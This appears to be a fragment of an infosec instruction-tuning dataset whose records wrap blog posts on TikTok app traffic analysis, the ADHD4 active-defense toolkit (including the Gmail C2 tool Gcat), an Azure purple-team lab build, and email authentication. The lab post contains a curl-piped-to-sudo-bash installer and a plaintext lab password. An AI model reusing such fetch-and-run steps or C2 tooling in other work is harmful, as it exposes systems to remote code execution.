Card.android.permission.WRITE_EXTERNAL_STORAGEAllows an application to write to the SD card.android.permission.ACCESS_WIFI_STATEAllows an application to view the information about the status of Wi-Fi.android.permission.CAMERAAllows application to take pictures and videos with the camera This allows the application to collect images that the camera is seeing at any time.android.permission.RECORD_AUDIOAllows application to access the audio record path.android.permission.FLASHLIGHTAllows the application to control the flashlight.android.permission.WAKE_LOCKAllows an application to prevent the phone from going to sleep.android.permission.GET_TASKSAllows application to retrieve information about currently and recently running tasks May allow malicious applications to discover private information about other applications.android.permission.READ_CONTACTSAllows an application to read all of the contact address data stored on your phone Malicious applications can use this to send your data to other people.android.permission.RECEIVE_BOOT_COMPLETEDAllows an application to start itself as soon as the system has finished booting This can make it take longer to start the phone and allow the application to slow down the overall phone by always running.none.used.ACCESS_FINE_LOCATIONAccess fine location sources such as the Global Positioning System on the phone where available Malicious applications can use this to determine where you are and may consume additional battery power.none.used.ACCESS_COARSE_LOCATIONAccess coarse location sources such as the mobile network database to determine an approximate phone location where available Malicious applications can use this to determine approximately where you are.android.permission.VIBRATEAllows the application to control the vibrator.com.meizu.c2dm.permission.RECEIVEUnknown permission from android referencecom.zhiliaoapp.musically.permission.READ_ACCOUNTUnknown permission from android referencecom.zhiliaoapp.musically.permission.WRITE_ACCOUNTUnknown permission from android referencecom.android.launcher.permission.INSTALL_SHORTCUTAllows an application to install a shortcut in Launcher.com.android.launcher.permission.UNINSTALL_SHORTCUTDon't use this permission in your app This permission is no longer supported.com.android.launcher.permission.READ_SETTINGSUnknown permission from android referenceandroid.permission.AUTHENTICATE_ACCOUNTSAllows an application to use the account authenticator capabilities of the Account Manager including creating accounts as well as obtaining and setting their passwords.com.htc.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.lge.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.lge.launcher.permission.WRITE_SETTINGSAllows an application to modify the system's settings data Malicious applications can corrupt your system's configuration.com.huawei.launcher3.permission.READ_SETTINGSUnknown permission from android referencecom.huawei.launcher3.permission.WRITE_SETTINGSAllows an application to modify the system's settings data Malicious applications can corrupt your system's configuration.com.huawei.launcher2.permission.READ_SETTINGSUnknown permission from android referencecom.huawei.launcher2.permission.WRITE_SETTINGSAllows an application to modify the system's settings data Malicious applications can corrupt your system's configuration.com.ebproductions.android.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.ebproductions.android.launcher.permission.WRITE_SETTINGSAllows an application to modify the system's settings data Malicious applications can corrupt your system's configuration.com.oppo.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.oppo.launcher.permission.WRITE_SETTINGSAllows an application to modify the system's settings data Malicious applications can corrupt your system's configuration.com.huawei.android.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.huawei.android.launcher.permission.WRITE_SETTINGSAllows an application to modify the system's settings data Malicious applications can corrupt your system's configuration.dianxin.permission.ACCESS_LAUNCHER_DATAUnknown permission from android referencecom.miui.mihome2.permission.READ_SETTINGSUnknown permission from android referencecom.miui.mihome2.permission.WRITE_SETTINGSAllows an application to modify the system's settings data Malicious applications can corrupt your system's configuration.com.zhiliao.musically.livewallpaper.permission.wallpaperpluginUnknown permission from android referencecom.zhiliaoapp.musically.permission.MIPUSH_RECEIVEUnknown permission from android referencecom.zhiliaoapp.musically.push.permission.MESSAGEUnknown permission from android referencecom.android.vending.BILLINGUnknown permission from android referencecom.meizu.flyme.push.permission.RECEIVEUnknown permission from android referenceandroid.permission.WRITE_SYNC_SETTINGSAllows an application to modify the sync settings such as whether sync is enabled for Contacts.com.sec.android.provider.badge.permission.READUnknown permission from android referencecom.sec.android.provider.badge.permission.WRITEUnknown permission from android referencecom.htc.launcher.permission.UPDATE_SHORTCUTUnknown permission from android referencecom.sonyericsson.home.permission.BROADCAST_BADGEUnknown permission from android referencecom.sonymobile.home.permission.PROVIDER_INSERT_BADGEUnknown permission from android referencecom.majeur.launcher.permission.UPDATE_BADGEUnknown permission from android referencecom.huawei.android.launcher.permission.CHANGE_BADGEUnknown permission from android referenceandroid.permission.MODIFY_AUDIO_SETTINGSAllows application to modify global audio settings such as volume and routing.android.permission.REQUEST_INSTALL_PACKAGESMalicious applications can use this to try and trick users into installing additional malicious packages.android.permission.REORDER_TASKSAllows an application to move tasks to the foreground and background Malicious applications can force themselves to the front without your control.com.zhiliaoapp.musically.miniapp.PROCESS_COMMUNICATIONUnknown permission from android referencecom.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICEUnknown permission from android referencecom.google.android.c2dm.permission.RECEIVEUnknown permission from android referencecom.zhiliaoapp.musically.permission.RECEIVE_ADM_MESSAGEUnknown permission from android referencecom.amazon.device.messaging.permission.RECEIVEUnknown permission from android referenceandroid.permission.USE_CREDENTIALSAllows an application to request authentication tokens.android.permission.MANAGE_ACCOUNTSAllows an application to perform operations like adding and removing accounts and deleting their password.android.permission.READ_APP_BADGEUnknown permission from android referenceme.everything.badger.permission.BADGE_COUNT_READUnknown permission from android referenceme.everything.badger.permission.BADGE_COUNT_WRITEUnknown permission from android referenceandroid.permission.UPDATE_APP_BADGEUnknown permission from android referencecom.vivo.notification.permission.BADGE_ICONUnknown permission from android reference There were a few permissions that seemed odd to me for an app that has a purpose of sharing short video clips online The android.permission.AUTHENTICATE_ACCOUNTS allows for the creation of accounts and setting passwords I would question why that would be necessary and I have never seen that in other apps Then the 16 specific settings for modifying system data I would also wonder why those would be necessary But again it can be hard to determine from the outside looking in what functionality requires these If I had to make a yes or no decision on if the app was overly permissive I would say yes Since the phone was set up to use Burp as a proxy and the Burp CA installed and trusted we can move on to network traffic inspection When the app was launched the application traffic was intercepted I went through the initial what am I interested in choices and created an account and started watching a few videos and using the app for a few minutes Next I saved all HTTP requests intercepted by Burp to a file and used command line tools to get an idea of how many hosts were involved in communication from the app Using command-line utilities I counted 32 hosts that appeared to be related to TikTok network traffic For the most part I found these through manual analysis of the Proxy traffic listed in Burp and used the domains as search terms with grep on the command line to get an easier parse text list There were many GET requests to TickTok APIs profiling my device but this is not uncommon for developers to do Metrics for install base can be useful But it could definitely be viewed as data collection I also noticed something odd in the sense that I have not seen this with other apps that I have analyzed Note that the vast majority of the apps I look at are for work engagements It appeared that most of the HTTP message bodies for API calls were encrypted Why do I say that the data being sent was encrypted I have seen where API requests were gzip compressed but I have been able to look through the requests and find where the compressed file began and decode the traffic To investigate this I looked for the beginning of requests to hosts based on the time I launched the app and right-clicked on the message body and selected Send to Decoder This sends the request to the Burp Suite decoder which allows you to choose various types of decoding I was not able to locate a portion of data that was able to be decoded The requests in Burp can be saved to file by right-clicking in the proxy window and selecting Save Item The request will be base64 encoded and can be decoded at the command line by echo file_name Next take the HTTP header information out of the saved file and you are left with the message body Using the file utility on the file results in data returned no file magic bytes to discover I used the ent utility to check the entropy of a few of the larger message bodies and it appeared to be encrypted At this point the best option to break the encryption would be to do some in-depth static analysis on the extracted APK and figure out how encryption is implemented and write some code to decrypt it That's a bit beyond the scope of this post At this point in the analysis though if I were performing a risk analysis for allowing the app on company devices I think there would be enough data to decide against it But what about banning TikTok from the general public My opinion is that without breaking the encryption it would be hard for me to say My guess is that it was decrypted by someone and that data was being collected was viewed as an invasion of privacy To play Devil's Advocate though what if we looked at other popular apps with huge install bases Apps like Instagram Twitter Snapchat or Facebook They collect some amount of personal data We are in the Age of Surveillance Capitalism selling human behavior for targeted advertising is how money is made for these companies What data are they sending Getting at the data sent by these other popular social media apps is even more difficult as they are using a technique called Certificate Pinning to defeat traffic inspection This is where a specific certificate is embedded in the application to establish TLS encrypted communication and if that certificate is not used as in our case with using the Burp certificate then communication is not established To defeat Certificate Pinning one would need to inject code into the application at runtime using something like Frida to remove or bypass the pinning code or decompile the app and edit smali files"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Now That's What I Call ADHD! 4</title>\n<taxonomies>Author, How-To, Informational, James Marrs, moth, ADHD</taxonomies>\n<creation_date>Mon, 27 Jul 2020 13:42:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "moth James Marrs Introduction After a month of hard work Python headaches dependency hell and a bit of tool necromancy ADHD4 is here and we're thrilled to share it with the community This version features tools upgraded from Python 2 to Python 3 a fancy new applications menu updated reorganized documentation and more What's This ADHD stands for Active Defense Harbinger Distribution The driving idea of this security image is to actively defend your environment from a malicious attacker Want to leave an attacker clueless as to what ports are open ADHD has a tool for that Want to trick an attacker into falling into a honeypot with a fake file system that doesn't let them leave ADHD has a tool for that as well ADHD is not meant to replace other security solutions the goal is to supplement them with tools that can make an attacker's life really difficult Think of it as a mixtape of some of our favorite tools for active defense What's Old If you're already familiar with ADHD3 we've attempted to replicate configurations between versions and we think we've done a rather good job at it Credentials for the user and the databases have remained the same and tool directory structures in opt have remained the same as well The documentation repository has seen many files changed and rebased but the links have been updated to make this as hidden as possible In addition there's a handful of tools that have remained the same between versions so it's easy to hop back in right where you left off If you've not previously used ADHD you can find credential information at dhdproject.github.io !ADHD Credentials.md What's New There is a lot of new stuff in ADHD4 A new OS updated tools with new features a shiny application menu similar to Kali's and the list goes on Let's start with all the Python tools that got updated to Python 3 Tool Upgrades Gcat You may remember Gcat a program for establishing and managing C2 channels through Gmail It hadn't been updated in a long while and the alternatives listed in the README were still using Python 2 Gcat is a tool written by one of our own so we opted to resurrect it After a bit of work Gcat now works in Python 3.8 Only two features haven't been verified keylogging shellcode execution but we imagine we're not quite done with development Cowrie Cowrie is a medium-interactivity honeypot that spoofs an ssh server to catch and log attacker interactions Cowrie was a bit of a special case to upgrade Cowrie is already written in Python 3 and is an evolution of a similar Python 2 tool named Kippo The author of Cowrie removed a feature present in Kippo that we find desirable preventing attackers from exiting the honeypot Rather than upgrading Kippo to Python 3 we decided it was easier to graft the feature over from Kippo to Cowrie Spidertrap Spidertrap is a simple tool designed to catch web crawlers It works by generating an endless maze of links that leads to yet another endless maze Spidertrap was relatively painless to upgrade Most of the process was replacing print statements with print function calls Wordpot Wordpot is a honeypot that mimics a real wordpress install It is highly customizable through the use of templates Upgrading Wordpot wasn't too bad Most of the work had to do with syntax differences and updated libraries There were a few issues with using different templates but after some digging these were easy enough to fix After verifying the functionality of the tool with the updates we forked the tool into the ADHD repository Rubberglue Rubberglue is a tool that reflects attacker traffic back to the attacker Thanks to the use of the __future__ import changes to Rubberglue were minimal After tweaking the imports and blowing the dust off it was ready to go Operating System ADHD4 now uses Ubuntu 20.04 LTS as its operating system We went with Ubuntu because a lot of the tools seem to work best with this flavor of linux and we frankly needed a break from the old version of Linux Mint of past ADHD versions Choosing Ubuntu 20.04 LTS ensures that ADHD4 will have at least five years of future OS updates We were also able to take advantage of Ubuntu's menu bar and create a totally awesome applications menu The applications menu was lovingly inspired by a similar menu in Kali Linux and was designed to emulate it as closely as possible If you are familiar with Kali Linux we imagine using ADHD's applications menu will feel similar When using the applications menu many tools will open a terminal in the tool directory and print the tool's usage This makes it very easy for beginners to run and learn how to use the tools For some tools that run as services entries exist to start stop and view the status of the service Tool Removal Unfortunately we also had to remove several tools The following list shows all the tools that we had to remove from ADHD Cryptolocked Invisiport SQLite Bug Server HoneyBadger Red Docz.py Human.py Lockdown OpenBAC Simple-Pivot-Detect Sweeper TALOS HoneyDrive and all Windows tools You may notice that the list of removed tools is rather long Killing old tools certainly doesn't give us a warm and fuzzy feeling so we're looking to expand the current tool list Get Involved Want to get involved with ADHD Here's how Tool Suggestions Want to see one of your favorite tools added to a future version of ADHD Open an issue on the Awesome Active Defense repository at ithub.com adhdproject awesome-active-defense and suggest a tool Be sure to mention 0x6d6f7468 or martianjay in your issue details to get our attention We're looking forward to adding tools provided by the community Documentation Contributions Notice something wonky in one of the repositories Feel free to open an issue or submit a pull request Again please be sure to mention 0x6d6f7468 or martianjay so we see the requests quickly GitHub Repositories Before downloading the ADHD image there are several resources you can check out on GitHub for more information To see the project on GitHub go to ithub.com adhdproject This project contains repositories for all of the tools we have forked and modified as well as the documentation repository at ithub.com adhdproject adhdproject.github.io and the tool list repository ithub.com adhdproject awesome-active-defense To view ADHD's documentation browse to dhdproject.github.io Discord In addition to GitHub we will also be available on the BHIS Discord server which you can join by browsing to iscord.gg TPNn833 This invite link will bring you to the new adhd channel Mention moth or martianjay to say hello We're looking forward to having some great conversations there Download ADHD We've left you in suspense long enough and we can practically hear you shouting but guys where can I download ADHD4 Fret not friends If you want to take ADHD4 for a spin you can find it at dhdhost.s3.amazonaws.com ADHD4 ADHD4-sha1.ova Upon downloading ADHD4 we strongly recommend that you validate your download by comparing the file's signature against at least one of the following hashes Filename ADHD4-sha1.ovaMD5 3b0cc1846f86acac875679aaabdc8552SHA1 19f9f8e2be0fceffaf6e177123f78d896e0850bdSHA256 b461505166a930b5503f19a9a9e500abe62c924234dbc160f3fa5b2e7c204a5c On Windows you can get the hash of a file by running any of the following three commands in PowerShell Get-FileHash -Algorithm MD5 ADHD4-sha1.ovaGet-FileHash -Algorithm SHA1 ADHD4-sha1.ovaGet-FileHash -Algorithm SHA256 ADHD4-sha1.ova To do the same on MacOS or Linux run any of the following three commands in a terminal md5sum ADHD4-sha1.ovasha1sum ADHD4-sha1.ovasha256sum ADHD4-sha1.ova We hope you enjoy it"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To: Applied Purple Teaming Lab Build on Azure with Terraform (Windows DC, Member, and HELK!)</title>\n<taxonomies>Author, How-To, Informational, Jordan Drysdale, Kent Ickler, Azure, Detection Lab, Jordan Drysdale, Kent Ickler, purple teaming, Terraform</taxonomies>\n<creation_date>Mon, 03 Aug 2020 15:31:24 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Kent Ickler tl dr Ubuntu base OS install AZCLI unpack terraform gather auth tokens run script enjoy new domain ithub.com DefensiveOrigins APT-Lab-Terraform For those of you who have been diligently following along three webcasts now a four-hour intro training session on a Saturday our students who have attended the virtual courses it has been written The labs are now available for your use and deployment on Azure with a few reasonable steps The instructions below will spin up three systems on Azure with Terraform to mirror the classroom environment we preach DC member HELK They have the same IPs same creds everything you've gotten used to The steps are listed below and assume you have an account on Microsoft Azure If you do not already have one visit here and claim your 200 in credits zure.microsoft.com en-us free If my math is close you can run the lab built by the instruction set below for about 30 days on just the credits Anyway thanks for reading following along and keeping up with our efforts Step 1 New Ubuntu 18.04 on Digital Ocean at 5 month Step 2 Install AZCLI curl -sL ka.ms InstallAzureCLIDeb sudo bash Step 3 Gather up the terraform binaries unpack and add to PATH An old habit I learned from a fella named Fletch was to add packages and tools to opt Also be careful binary locations change over time Grab the latest terraform package location here ww.terraform.io downloads.html cd opt wget eleases.hashicorp.com terraform 0.12.29 terraform_0.12.29_linux_amd64.zip Unzip terraform_0.12.29_linux_amd64.zip mv terraform usr local bin Terraform should now be operational terraform -v Step 4 This step is a bit more complicated and is likely to cause some trouble on the path to deployment We need to gather the necessary token information to authenticate via AZCLI to our Azure subscriptions az login This command should prompt us for authentication on the AZ cloud I simply accessed an existing Azure session and followed the instructions The next command is used to set your authenticated AZ CLI session to the appropriate subscription az account set --subscription YOUR_SUBSCRIPTION_ID The next command will create a service principal with role-based access controls for this deployment az ad sp create-for-rbac --role Contributor --scopes subscriptions YOUR_SUBSCRIPTION_ID This command will output some sensitive information as indicated by zeroes in the following screenshot which was lifted from a Microsoft article linked as a reference Each of these values will be inserted into your LabBuilder.py script appId is the client_id password is the client_secret tenant is the tenant_id Step 5 Gather the repo and configure the LabBuilder script for your subscription and service principal git clone ithub.com DefensiveOrigins APT-Lab-Terraform.git cd APT-Lab-Terraform vi vim nano emacs word textpad mousepad leafpad notepad LabBuilder.py Step 6 Build python3 LabBuilder.py -m Right now I am guessing a complete build will be done in 27 minutes This build finished in a modest 23 minutes 53.8 seconds The output as shown is just a public IP address from Microsoft's allocations That address has a listening remote desktop service available to the labs.local itadmin user The password is APTClass no quotes Please recognize that at this point the optics stack is unconfigured you will not see a thing in Elastic no Sysmon is installed nada A fantastic description of the code base itself all the underlying systems services users etc is available on the git repo A high level overview of the lab environment at this point is listed below This information is also documented on the git repo Windows DC 10.10.98.10 Public IP restricted to the provided public IP will land on the Windows member system Windows WS 10.10.98.14 HELK 10.10.98.20 Kafka on 9092 etc Logstash on 5044 Elastic on 443 SSH on 22 In our experience this lab runs between six and eight bucks a day 6.00 8.00 day on Azure AWS is more than twice this cost in testing thus far Which for newcomers to Azure you are eligible for 200 in credits Some useful links ithub.com DefensiveOrigins APT-Lab-Terraform ithub.com Cyb3rWard0g HELK efensiveorigins.com ww.terraform.io downloads.html ww.terraform.io docs providers azurerm guides service_principal_client_secret.html Next up using two individual scripts to install the entire Windows optics stack and ship logs Once you run these scripts the listening Apache Kafka broker will do its thing and you will start seeing log data in Elastic This will get turned loose in the same repo"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How SPF, DKIM, and DMARC Authentication Works to Increase Inbox Penetration (Testing) Rates</title>\n<taxonomies>Author, Fun & Games, How-To, Informational, InfoSec 101, Kent Ickler, Kent Ickler</taxonomies>\n<creation_date>Wed, 19 Aug 2020 12:05:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler TL DR Want a quick fix Almost every marketing platform we've seen has decent tutorials on authorizing outbound email with SPF and DKIM authorization Salesforce elp.salesforce.com articleView?id 000315520 language en_US SendGrid endgrid.com docs glossary spf MailChimp ailchimp.com help set-up-custom-domain-authentication-dkim-and-spf MailGun xtoolbox.com c outboundemailsources?public Mailgun Amazon SES ocs.aws.amazon.com ses latest DeveloperGuide send-email-authentication-spf.html Constant Contact nowledgebase.constantcontact.com articles KnowledgeBase 34717-SPF-Self-Publishing-for-Email-Authentication?lang en_US If you're a marketing arm of your organization or are a mass marketing company and cherish the absolute brilliance of Sender Policy Framework SPF DomainKeys Identified Mail DKIM and Domain-based Message Authentication Reporting and Conformance DMARC stop now This isn't for you You already know what I have to say Bottom line This is subject to individual server configuration but generally speaking the more you can prove to a recipient mailserver that an email is valid authorized and intended the more likely it is to reach an inbox If you don't know what I just said prepare for a ride Your mass marketing emails are hitting my inbox not because you bypassed our spam discernment but because our clients mailservers are sometimes misconfigured and we don't want to miss an important email from our customers At BHIS some emails that otherwise would go to spam get sent into our inbox and tagged to remind our staff that extra scrutiny is warranted because something is amiss and we are calling the email's origin into suspicion Disclaimer This blog uses the words Authenticated Authorized and Vetted somewhat loosely to represent the process and outcomes related to SPF DKIM and DMARC validation In this context the definitions are analogous and don't align to how InfoSec would typically define them Assume unauthenticated unauthorized unvetted untrusted is not preferred Let's Talk about email Authorization Back in the day email was just trusted by everyone Remember when it was fun to send email from president whitehouse.gov Well nevermind Do Hackers Phish Yes hackers phish These days email has a problem big-spam phishing malice tom-foolery etc The consequence of the untrustworthiness of bad-intention is that today's email services have migrated to a new default expectation that email should be vetted prior to delivery This is a good trend too but it means emails now need to provide more information about how they were sent to prove their intent and authorization A new norm Untrusted email is not trustworthy Or Unauthorized email is not authorized Or Credentials please We're not saying that unauthenticated unvetted email disappears into oblivion We are however saying that the authorization and providence an email can deliver itself with will increase its likelihood of successful delivery It's become important for mail providers to provide a service that protects their end users from various bad-intent threats Not all emails are threats but some are Distinguishing between them can be difficult even for humans Protocols exist that can allow mail servers to validate the authenticity and authorization of email during delivery Email platforms have come to rely on those protocols for spam discernment and it's a good thing In days past it was less important for mass-marketing to worry about intent authorization or validation Emails would all deliver just fine Today not so Between threat intel feeds deny-lists and massive spam operations marketers need a way to ensure they can inform delivery servers that their email isn't spam even if the email contains trigger words like deposit account number or Junior Financial Secretary to the King of Algeria This is where SPF DKIM and DMARC come into play SPF and DKIM platforms provide a mechanism for the registrant Domain Administrator of a domain to authorize trust authorize which email servers are allowed to send email indicating their domain name in email headers such as the From email address Additionally DMARC provides methods for enforcing SPF and DKIM and a mechanism for reporting compliance metrics and logging of authorized email activity Sender Policy Framework SPF Sender Policy Framework SPF consists of a DNS record that an administrator can add to their domain's zone file and a protocol that instructs a recipient mail server to validate the originating mail server's authorization to use the indicated domain name We've talked about this before How to Configure SPFv1 for The Masses ww.blackhillsinfosec.com how-to-configure-spfv1-explained-for-the-masses Automating Anti-Phishing Recon using SPF ww.blackhillsinfosec.com offensive-spf-how-to-automate-anti-phishing-reconnaissance-using-sender-policy-framework Deep Dive RFC 4408 ools.ietf.org html rfc4408 obsolete RFC 6652 ools.ietf.org html rfc6652 RFC 7208 ools.ietf.org html rfc7208 DomainKey Identified Mail DKIM DKIM is a public key infrastructure that includes two keys The first key is entered in the domain name zone file for public access This key is then referenced by name in outbound emails by mail servers The second key private is stored on the email server and used to cryptographically sign hash computations of the email's various components DKIM compliant emails include a mail-header meta-data that provide the DKIM private key's matching public key name the email's computed hash the cryptographically signed hash and instructions to process validate the signed hash The comparison of email hash and validation of crytophraphicaly signed hash determines the emails DKIM validation Deep Dive RFC 6376 DKIM ww.ietf.org rfc rfc6376.txt Domain-based Message Authentication Reporting and Conformance DMARC DMARC is a protocol that instructs recipient mail servers what to do if SPF and DKIM are absent or invalid DMARC also provides a method for recipient mail servers to report to the indicated domain owner about current email trends including potential malicious activity This can effectively close the gap of an adversary sending unauthorized emails without the knowledge of the domain owner Deep Dive Dmarc Technical Specifications marc.org resources specification RFC 7489 DMARC ools.ietf.org html rfc7489 RFC 8553 Supporting DNS Changes ools.ietf.org html rfc8553 RFC 7960 Interoperability of DMARC ools.ietf.org html rfc7960 RFC 6591 Failure Reporting Format ools.ietf.org html rfc6591 RFC 8601 Message Header Field for Authentication ools.ietf.org html rfc7601 Ok so what's the deal If you're using a mass-email platform and you didn't go through the effort to authorize that email platform with SPF DKIM and create a ruleset in DMARC the entirety of the inbox penetration rates will depend not on your marketing efforts but on the configuration of the recipient mail servers to handle unauthorized email Unvetted email is in fact unvetted If you've spent the money to make an effective email campaign Be sure you spent the time to ensure it will hit inboxes Marketeering hot tip Setup SPF DKIM and DMARC It will take you less than a half hour to do and your inbox penetration rate will go up What You want a Demo OK The Pathology of Email Authorization Validation Here I've sent an email from my BlackHillsInfoSec.com email address to my DefensiveOrigins.com email account On my Defensive Origins account I have opened the full source of the email that includes the specific mail headers that have been appended by the various origin transport and destination mail servers As Sent As Received The email headers that were included in the received email are where we start investigating how the email validation process played out Let's start with SPF Sender Policy Framework Autopsy SPF was around before DKIM It's not absolute that a recipient mail server will first check SPF records but it's fair to assume that most recipient mail servers will validate a mail server for authorization according to SPF standards Let's look at the email I sent myself Remember this email is coming from blackhillsinfosec.com We can check BlackHillsInfoSec.com's SPF record using MXToolbox or by querying DNS ourselves We will run the DNS query in a moment but let's check out MXToolbox's ability to quickly decode the SPF syntax into common language MXToolbox is a great tool for quickly reading SPF records The important bit here is the SPF include _spf.google.com method in Black Hills SPF record The include method instructs the recipient mail server to query the SPF record of _spf.google.com and include it in the SPF record of blackhillsinfosec.com As we will see in a moment the _spf.google.com record also has inclusions of more SPF records Always take great care when adding an include method in an SPF record you may be authorizing more than you think The list can grow pretty quick The domain administrator of BlackHillsInfoSec.com expects SPF authorizes via DNS record mail indicating blackhillsinfosec.com to be originated from the associated Google mail servers Did I mention that BlackHillsInfosec.com uses GSuite Google Suite In the email received by my DefensiveOrigins account the recipient mail server has included information about the email server that originated the email The header below indicates the email was originated by the mail server referenced as mail-ed1-f53.google.com With a few DNS queries we can track down if this is SPF validated for BlackHillsInfoSec.com according to the BlackHillsInfoSec.com SPF record The use of the include SPF method was used to validate the originating Google email server We manually validated that the email was sent via an SPF authorized server using nslookup The Defensive Origins mail server came to the same conclusion and documented the authorization result in an appended mail header in the received email named Received-SPF This header is defined in RFC 7208 ools.ietf.org html rfc7208 The recipient mail server also included a summary of the various validation checks in the mail header named Authentication-Results This is a summary of the authentication process This header is defined in RFC 7601 ools.ietf.org html rfc7601 made obsolete by RFC 8601 ools.ietf.org html rfc8601 Congrats SPF VALIDATION ACHIEVEMENT BADGE Next up Public Key Infrastructure and email authorization DKIM Signing Validation Black Hills also has DKIM validation that authorizes mail servers by use of cryptographic signatures of portions of the contents of emails This allows recipient mail servers to validate specific email headers and email body content has not been tampered and verify email is authorized by the Domain Administrators of BlackHillsInfosec.com DKIM's use of Public Key Infrastructure PKI Mail administrators create a DKIM compliant key pair A key private is stored on the email server and used to cryptographically sign computed hashes of specific email components The public key is posted in public DNS in a special subdomain of the indicated domain name It is not good practice to re-use keys-pairs for multiple servers DKIM allows for use of multiple key-pairs When emails are sent with DKIM signing the originating email server will include an email header that indicates which DNS DKIM public key to validate the email's cryptographically signed hashes The selection of the DKIM public key is called the selector The selector instructs the recipient mail server which DNS record to query to obtain the DKIM public key The DKIM public key is procured by a DNS TXT query of selector ._domainkey.domain.tld The public key found on the DNS TXT record is used to validate the cryptographic signature included in the DKIM authorized email header The comparison of the computed email hash and validation of the cryptographic signature determines if the email is DKIM authorized In the email I sent from BlackHillsInfosec.com the originating email server had included the DKIM-Signature mail header This header is defined in RFC 6376 ools.ietf.org html rfc6376 and includes the cryptographically signed hash as well as instructions for the recipient mail server to create the hash and validate the signature The above email header indicates that we are using v 1 Version one of DKIM protocol a Hash Algorithm c Hash input method accounts for header modification in transit s Public Key selector h Headers that have been signed in b bh hash of body part s according to c base64 b Cryptographically signed hash of body headers The originating email server used its DKIM private key to cryptographically sign the hash values for the body bh hash and store the signed hash b hash signature This process is detailed in RFC-6376 Section 3.7 but ultimately the output is a signature that can be validated with the DKIM public key Upon the recipient email server analyzing the DKIM mail header it began its DKIM validation process It used the information from parameters a c and h to compute a hash of the email components The hash was then compared to the value provided in parameter bh If the hashes matched the validation process continued If the hashes did not match the DKIM validation has failed The recipient mail server then queried DNS to retrieve the DKIM public key by using the indicated domain and selector specified in the DKIM header d blackhillsinfosec.com s google CODE dig google._domainkey.blackhillsinfosec.com txt DiG 9.11.3 google._domainkey.blackhillsinfosec.com txt ANSWER SECTION google._domainkey.blackhillsinfosec.com 1800 IN TXT v DKIM1 k rsa p MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBi QKBgQCVxOyLCpVSrOzHZxkQciLBVhOkDYeMoM0A9A NVUERAgXA7HDnP8c63tCrq8aKOv KwcTAXF1EV BSNQcneCmG QX9oWPuTBvkX2J wG0oRt oP155KcJBbdczO9mmOwnFxTgiIiuF6oYT92cvcNT6zUh4QtvFmypMkIGrEZeGF9oQI DAQAB CODE The server then validated the signed hash b using the DKIM public key The cryptographic signature is validated using the public-key and the email is considered DKIM authorized If the signed hash could not be validated or the public key could not be retrieved the email would have failed DKIM authorized After the DKIM validation process the recipient mail server included in DKIM validation results in the Authentication-Results header Congrats DKIM VALIDATION ACHIEVEMENT At this point in validation we have confirmed that the email was sent via an SPF authorized email system and that the email used DKIM signatures to validate delivery and specific unmodified content between the originating mail server the transport server and the delivery server But what happened if that wasn't the case That's where DMARC comes in Question Time What happens if an email includes a DKIM signature but fails DKIM validation What happens if SPF authenticates an email server but the DKIM signature was missing What if the DKIM signature is validated but SPF indicates the mail server wasn't authorized Can an administrator be notified if someone is sending authorized email Can an administrator be notified if someone is sending unauthorized email All of these questions and related problems are solved by the use of DMARC Much like SPF and DKIM DMARC is a DNS TXT record assigned to the domain zone file of an indicated email domain The DMARC record instructs recipient mail servers how received email should be processed based on the results of the SPF and DKIM protocols and additional instructions to create a feedback loop notifying an administrator of the indicated domain's email use Our example email was sent from BlackHillsInfosec.com The recipient mail server queried the BlackHillsInfoSec.com domain for its DMARC DNS record The DNS record instructed the recipient mail server how to process the email based on its SPF and DKIM results The DMARC DNS record is assigned to a special subdomain named _dmarc In our case the recipient mail server queried TXT record for _dmarc.blackhillsinfosec.com CODE C nslookup -type txt _dmarc.blackhillsinfosec.com Non-authoritative answer _dmarc.blackhillsinfosec.com text v DMARC1 p none rua mailto dmarc_reports blackhillsinfosec.com ruf mailto dmarc_forensic blackhillsinfosec.com fo 1 CODE The BHIS Dmarc record above instructs mail servers that the txt record is a valid DMARC txt record The BHIS record instructs the recipient mail server to process the email according to this DMARC configuration v DMARC1 DMVARC v1 valid TXT record p none if email fails validation do nothing additional Rua Send aggregate mail data o dmarc_reports blackhillsinfosec.com Ruf Send failure forensic reports to dmarc_forensic blackhillsinfosec.com fo 1 Send forensic upon SPF or DKIM not-pass The email having been successfully SPF and DKIM validated is processed according to the DMARC ruleset and is delivered to the intended recipient However not without being part of an aggregate report sent in compliance with the DMARC record Congrats DMARC VALIDATION BADGE About those DMARC reports You might be asking a question Just how many emails go to those notification addresses we specified in the DMARC record Well in regards to DMARC compliant mail servers we get 1 aggregate email per recipient-mail-server per indicated-domain per day 1 forensic report per unauthorized email delivery The math here is effectively 